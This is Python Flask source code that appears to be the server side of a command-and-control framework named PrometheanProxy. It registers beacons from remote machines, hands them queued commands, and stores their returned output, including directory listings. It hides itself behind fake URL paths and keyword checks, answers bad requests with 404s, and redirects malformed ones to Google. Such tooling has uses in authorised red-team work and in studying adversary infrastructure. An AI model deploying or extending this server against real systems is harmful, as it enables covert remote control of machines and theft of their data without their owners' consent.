from flask import Flask, request, jsonify, redirect
import uuid
import os
import time
import logging

from flask_socketio import SocketIO
from Modules.global_objects import (
    beacon_list, command_list, config, logger)
from Modules.beacon import add_beacon_list

beaconControl = Flask(__name__)
socketio = SocketIO(
    beaconControl,
    cors_allowed_origins="*",
    async_mode="threading"
)
log = logging.getLogger('werkzeug')
beaconControl.logger.setLevel(logging.ERROR)
log.setLevel(logging.ERROR)


"""
This is used for the connection request, it requires the following parameters:
    - part1 + part2 are random strings/ fake directories
    - ad_param is a string that contains the word "ad"
    - hard coded param API
    - version is an integer between 1 and 10
If the parameters are not met or the data is not in the correct format,
it will return a 404
"""


@beaconControl.route('/<part1>/<part2>/<ad_param>/api/v<int:version>',
                     methods=['POST'])
def connectionRequest(part1, part2, ad_param, version):
    logger.info(f"Connection request received from {part1}/{part2}/{ad_param}/api/v{version}")  # noqa
    if "ad" not in ad_param or version not in range(1, 11):
        logger.error("Invalid parameters in connection request")
        return '', 404
    data = request.get_json()
    logger.debug(f"Received data: {data}")
    if data and 'name' in data and 'os' in data and 'address' in data:
        name = data['name']
        os = data['os']
        address = data['address']
        userID = str(uuid.uuid4())
        logger.info(f"New connection from {name} on {os} at {address} with UUID {userID}")
        add_beacon_list(userID, address, name,
                        os, time.asctime(),
                        config['beacon']["interval"],
                        config['beacon']['jitter'],
                        config)
        logger.debug(f"Beacon list updated with userID: {userID}, address: {address}, name: {name}, os: {os}") 
        socketio.emit('new_connection', {'uuid': userID, 'name': name, 'os': os, 'address': address, "interval": config['beacon']["interval"], "jitter": config['beacon']['jitter']}) # noqa
        logger.info(f"Emitted new connection event over websockets for UUID: {userID}")
        return {"timer": config['beacon']["interval"],
                "uuid": userID, "jitter": config['beacon']['jitter']}, 200
    else:
        logger.error("Invalid data format in connection request redirecting to Google")
        return redirect("https://www.google.com", code=302)


"""
This is used for the reconnection request if the client looses
connection to the server.
It requires the following parameters:
    - part1 is a random string/ fake directory
    - ad_param is a string that contains the word "ad"
    - hard coded param getLatest
If the parameters are not met or the data is not in the correct format,
it will return a 404
"""


@beaconControl.route('/<part1>/<ad_param>/getLatest', methods=['POST'])
def reconect(part1, ad_param):
    logger.info(f"Reconnection request received from {part1}/{ad_param}/getLatest")
    if "ad" not in ad_param:
        logger.error("Invalid ad_param in reconnection request")
        return '', 404
    data = request.get_json()
    logger.debug(f"Received data: {data}")

    name = data["name"]
    os = data["os"]
    address = data["address"]
    ID = data["id"]
    timer = data["timer"]
    jitter = data["jitter"]
    logger.info(f"Reconnection data: name={name}, os={os}, address={address}, ID={ID}, timer={timer}, jitter={jitter}")

    if name and os and address and ID and timer and jitter:
        add_beacon_list(ID, address, name, os, time.asctime(),
                        float(timer), float(jitter), config)
        logger.info(f"Beacon list updated with ID: {ID}, address: {address}, name: {name}, os: {os}, timer: {timer}, jitter: {jitter}")
        return {"x": True}, 200
    else:
        logger.error("Invalid data format in reconnection request")
        return '', 404


@beaconControl.route('/checkUpdates/<part1>/<part2>', methods=['GET'])
def beaconCallIn(part1, part2):
    logger.info(f"Beacon call-in received from {part1}/{part2}")
    data = {}
    id = request.args.get('session')
    if not id:
        logger.error("No session ID provided in beacon call-in")
        return '', 400
    for userID, beacon in beacon_list.items():
        if userID == id:
            beacon.last_beacon = time.asctime()
            timer = beacon.timer  # Removed comma
            jitter = beacon.jitter  # Removed comma
            next_beacon_time = time.time() + timer
            beacon.next_beacon = time.asctime(
                time.localtime(next_beacon_time))
            logger.info(f"Beacon {id} updated with timer: {timer}, jitter: {jitter}, next beacon time: {beacon.next_beacon}")
            # Emit countdown update via SocketIO
            socketio.emit('countdown_update', {
                'uuid': id,
                'timer': timer,
                'jitter': jitter,
            })
            logger.info(f"Emitted countdown update for UUID: {id} with timer: {timer} and jitter: {jitter}")

    commandToSend = []
    logger.debug(f"Preparing commands for beacon {id}")
    for commandID, command in command_list.items():
        if command.beacon_uuid == id:
            if command.executed:
                continue
            else:
                logger.debug(f"Command {commandID} for beacon {id} is ready to be sent")
                commandToSend.append({
                    "command_uuid": commandID,
                    "command": command.command,
                    "data": command.command_data
                })
            command.executed = True
    if commandToSend:
        data["commands"] = commandToSend
    else:
        data["none"] = "none"
    return jsonify(data), 200


@beaconControl.route('/updateReport/<path1>/api/v<int:version>',
                     methods=['POST'])
def response(path1, version):
    logger.info(f"Response received from {path1}/api/v{version}")
    if version not in range(1, 11):
        logger.error("Invalid version in response")
        return '', 404
    data = request.get_json()
    logger.debug(f"Received data: {data}")
    reports = data.get('reports', [])
    if reports and 'command_uuid' in reports[0]:
        cid = reports[0]['command_uuid']
        output = reports[0]['output']
        logger.info(f"Command UUID {cid} with output received")
    else:
        cid = ''
        output = ''
    found = False
    for _, command in enumerate(command_list.values()):
        if cid == command.command_uuid:
            found = True
            command.command_output = output
            if command.command == "directory_traversal":
                print("Directory Traversal Responded, saved to file")
                logger.info(f"Directory Traversal command {command.beacon_uuid} responded with output, saving to file")
                if not os.path.exists(os.path.expanduser(f"~/.PrometheanProxy/{command.beacon_uuid}")):
                    logger.info(f"Creating directory for beacon UUID: {command.beacon_uuid}")
                    os.makedirs(os.path.expanduser(f"~/.PrometheanProxy/{command.beacon_uuid}"))
                    socketio.emit("directory_traversal", {
                        'uuid': command.beacon_uuid,
                        'command_id': command.command_uuid,
                        'command': command.command,
                        'response': output
                    }
                    )
                with open(os.path.expanduser(f"~/.PrometheanProxy/{command.beacon_uuid}/directory_traversal.json"), "w") as f:
                    logger.info(f"Writing directory traversal output to file for beacon UUID: {command.beacon_uuid}")
                    f.write(output)
            else:
                print(
                    f"Command {command.beacon_uuid} ",
                    "responded with: output"
                )
                socketio.emit('command_response', {
                'uuid': command.beacon_uuid,
                'command_id': command.command_uuid,
                'command': command.command,
                'response': output
                })
            logger.info(f"Command {command.beacon_uuid} responded with output: {output}")
           
            logger.info(f"Emitted command response for UUID: {command.beacon_uuid}, command ID: {command.command_uuid}, command: {command.command}, response: {output}") # noqa
    if not found:
        return '', 500
    return '', 200
